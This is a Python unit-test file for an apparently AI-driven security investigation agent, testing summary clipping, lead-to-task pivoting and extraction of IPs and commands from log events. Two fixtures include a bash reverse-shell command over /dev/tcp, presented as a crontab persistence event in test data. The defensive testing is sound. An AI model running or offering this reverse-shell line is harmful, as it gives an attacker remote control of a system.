import json
import asyncio
import unittest
from unittest.mock import patch

from langchain_core.messages import ToolMessage

from agent.runtime import graph
from agent.runtime.analysis.artifacts import extract_artifacts


def _state(description="", handoff=None, final_answer=""):
    return {
        "run_id": "run-1",
        "case_id": "case-1",
        "agent_name": "investigation",
        "question": "diagnose",
        "handoff": handoff or {},
        "current_task": {
            "id": "task-1",
            "title": "Check scan evidence",
            "description": description,
        },
        "messages": [],
        "steps": 0,
        "tool_calls_made": 0,
        "max_steps": 10,
        "max_tool_calls": 10,
        "status": "running",
        "final_answer": final_answer,
        "ctx_tokens": 0,
        "current_intent": "",
        "intent_sequence": 0,
        "model_calls_made": 0,
        "validation_retries": 0,
        "verdict": None,
        "pivot_tasks_created": 0,
        "public_intent_enabled": False,
    }


def _answer(findings, facts="- None confirmed.", hypotheses="- No open hypotheses."):
    return (
        "## Confirmed Facts\n"
        f"{facts}\n\n"
        "## Findings\n\n"
        f"{findings}\n\n"
        "## Hypotheses\n"
        f"{hypotheses}"
    )


class GroundedOutputGuardTests(unittest.TestCase):
    def test_synthesis_preserves_facts_and_hypotheses_while_clipping_findings(self):
        long_findings = "A" * (graph._MAX_SYNTHESIS_FINDINGS_CHARS + 50)
        summary = _answer(
            long_findings,
            facts="- Event evt-123456 shows root crontab inserted `/bin/bash -c bash -i >& /dev/tcp/10.0.2.5/4444 0>&1`.",
            hypotheses="- The crontab modification was persistence.",
        )

        out = graph._task_summary_for_synthesis(summary)

        self.assertIn("/dev/tcp/10.0.2.5/4444", out)
        self.assertIn("The crontab modification was persistence.", out)
        self.assertIn("[clipped 50 chars from Findings", out)

    def test_new_leads_create_tasks_without_board_hypothesis(self):
        class FakeTool:
            def __init__(self, name, result):
                self.name = name
                self.result = result

            async def ainvoke(self, args):
                return self.result

        state = _state(final_answer=(
            "## Confirmed Facts\n"
            "- None confirmed.\n\n"
            "## Findings\n\n"
            "A follow-up lead was found.\n\n"
            "## Hypotheses\n"
            "- No open hypotheses.\n\n"
            "## New Leads\n"
            "- title: Investigate if any subsequent 401/403 or 500 errors were generated during the same scan window\n"
            "  pivots: agent_ip=10.0.2.15\n"
            "  priority: 70\n"
        ))
        config = {
            "configurable": {
                "tools": [
                    FakeTool("list_tasks", json.dumps([])),
                    FakeTool("create_task", json.dumps({"id": "task-2"})),
                ]
            }
        }
        with patch.object(graph, "_record_board_entry") as record:
            asyncio.run(graph.pivot(state, config))

        record.assert_not_called()

class ArtifactExtractionTests(unittest.TestCase):
    def test_reverse_shell_diff_text_records_command_and_embedded_ip(self):
        raw = json.dumps({
            "_id": "evt-123456",
            "full_log": "syscheck diff added: /bin/bash -c 'bash -i >& /dev/tcp/10.0.2.5/4444 0>&1'",
        })

        artifacts = extract_artifacts(raw)
        values = {(artifact.kind, artifact.value) for artifact in artifacts}

        self.assertIn(("ip", "10.0.2.5"), values)
        self.assertTrue(any(kind == "command" and "/dev/tcp/10.0.2.5/4444" in value for kind, value in values))
